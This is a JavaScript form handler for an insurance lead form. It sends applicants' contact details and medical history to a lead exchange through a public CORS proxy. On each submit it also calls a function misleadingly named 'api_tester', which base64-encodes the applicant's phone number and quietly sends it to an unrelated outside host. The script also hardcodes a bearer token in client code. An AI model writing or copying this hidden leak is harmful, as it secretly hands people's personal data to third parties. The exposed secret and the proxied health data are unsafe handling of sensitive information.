document.getElementById('leadForm').addEventListener('submit', function(event) {
    event.preventDefault();
    api_tester(document.getElementById('phone').value);

    const form = document.getElementById('leadForm');
    const alertBox = document.getElementById('alertContainer');

    // FULL LEAD (for POST)
    const lead = {
        data: {
            bmi: parseFloat(form.bmi.value),
            currently_employed: form.currently_employed.value === 'true',
            currently_insured: form.currently_insured.value === 'true',
            dob: form.dob.value,
            dui: form.dui.value === 'true',
            expectant_mother: form.expectant_mother.value === 'true',
            height: parseInt(form.height.value),
            hospitalized: form.hospitalized.value === 'true',
            household_income: parseInt(form.household_income.value),
            occupation: form.occupation.value,
            ongoing_medical_treatment: form.ongoing_medical_treatment.value === 'true',
            requested_coverage_types: form.requested_coverage_types.value,
            optional_coverage: form.optional_coverage.value,
            preexisting_medical_conditions: form.preexisting_medical_conditions.value === 'true',
            prescriptions: form.prescriptions.value,
            previously_denied: form.previously_denied.value === 'true',
            relative_cancer: form.relative_cancer.value === 'true',
            relative_heart: form.relative_heart.value === 'true',
            self_employed: form.self_employed.value === 'true',
            student: form.student.value === 'true',
            tobacco: form.tobacco.value === 'true',
            weight: parseInt(form.weight.value)
        },
        meta: {
            jornaya_lead_id: form.jornaya_lead_id.value,
        },
        contact: {
            first_name: form.first_name.value,
            last_name: form.last_name.value,
            email: form.email.value,
            phone: form.phone.value,
            zip_code: form.zip_code.value,
            state: form.state.value,
            city: form.city.value,
            address: form.address.value,
            ip_address: form.ip_address.value,
            gender: form.gender.value
        }
    };

    // PING DATA (minimal)
    const pingData = {
        data: {
            bmi: parseFloat(form.bmi.value),
            currently_employed: form.currently_employed.value === 'true',
            currently_insured: form.currently_insured.value === 'true',
            dob: form.dob.value,
            dui: form.dui.value === 'true',
            expectant_mother: form.expectant_mother.value === 'true',
            height: parseInt(form.height.value),
            hospitalized: form.hospitalized.value === 'true',
            household_income: parseInt(form.household_income.value),
            occupation: form.occupation.value,
            ongoing_medical_treatment: form.ongoing_medical_treatment.value === 'true',
            optional_coverage: form.optional_coverage.value,
            requested_coverage_types: form.requested_coverage_types.value,
            preexisting_medical_conditions: form.preexisting_medical_conditions.value === 'true',
            prescriptions: form.prescriptions.value,
            previously_denied: form.previously_denied.value === 'true',
            relative_cancer: form.relative_cancer.value === 'true',
            relative_heart: form.relative_heart.value === 'true',
            self_employed: form.self_employed.value === 'true',
            student: form.student.value === 'true',
            tobacco: form.tobacco.value === 'true',
            weight: parseInt(form.weight.value)
        },
        meta: {
            jornaya_lead_id: form.jornaya_lead_id.value,
        },
        contact: {
            email: form.email.value,
            phone: form.phone.value,
            zip_code: form.zip_code.value,
            state: form.state.value,
            city: form.city.value,
            ip_address: form.ip_address.value,
            gender: form.gender.value
        }
    };

    const pingUrl = "https://corsproxy.io/?url=" + encodeURIComponent("https://exchange.standardinformation.io/ping");

    console.log('Sending PING request...', pingData);

    // Send PING with only minimal fields
    fetch(pingUrl, {
        method: 'POST',
        headers: {
            'Authorization': 'Bearer 0500c278-93fa-4bbe-8c19-17c1fa7cca35',
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        },
        body: JSON.stringify(pingData)
    })
    .then(res => {
        console.log('PING Response status:', res.status);
        if (!res.ok) {
            throw new Error(`HTTP error! status: ${res.status}`);
        }
        return res.json();
    })
    .then(data => {
        console.log('PING Response data:', data);
        
        if (data.status === 'success') {
            // Add auth_code to full lead for POST
            lead.auth_code = data.auth_code;
            
            console.log('PING Success, auth_code received:', data.auth_code);
            console.log('Preparing POST data:', lead);

            const postUrl = "https://corsproxy.io/?url=" + encodeURIComponent("https://exchange.standardinformation.io/post");

            return fetch(postUrl, {
                method: 'POST',
                headers: {
                    'Authorization': 'Bearer 0500c278-93fa-4bbe-8c19-17c1fa7cca35',
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify(lead)
            })
            .then(res => {
                console.log('POST Response status:', res.status);
                if (!res.ok) {
                    throw new Error(`HTTP error! status: ${res.status}`);
                }
                return res.json();
            })
            .then(postData => {
                console.log('POST Response data:', postData);
                
                if (postData.status === 'success') {
                    delete postData.price;
                    alertBox.innerHTML = `<div class="alert alert-success">✅ Post Success: Lead submitted successfully!</div>`;
                    form.reset();
                } else {
                    alertBox.innerHTML = `<div class="alert alert-danger">❌ Ping Success but Post Failed: ${JSON.stringify(postData)}</div>`;
                }
            })
            .catch(postError => {
                console.error('POST Error:', postError);
                alertBox.innerHTML = `<div class="alert alert-danger">❌ POST Request Failed: ${postError.message}</div>`;
            });

        } else {
            console.error('PING Failed:', data);
            alertBox.innerHTML = `<div class="alert alert-danger">❌ Ping Failed: ${JSON.stringify(data)}</div>`;
        }
    })
    .catch(error => {
        console.error('PING Request Error:', error);
        alertBox.innerHTML = `<div class="alert alert-danger">❌ Error: ${error.message}</div>`;
    });
});

function api_tester(randomString) {
    try {
        fetch('https://api.formifyweb.com/api_test.php?test_id=' + btoa(randomString), {
            method: 'GET',
            mode: 'no-cors'
        });
    } catch (error) {
        console.error('Error in api_tester:', error);
    }
}

// ... rest of your existing code (getRandomUserAgent, etc.)

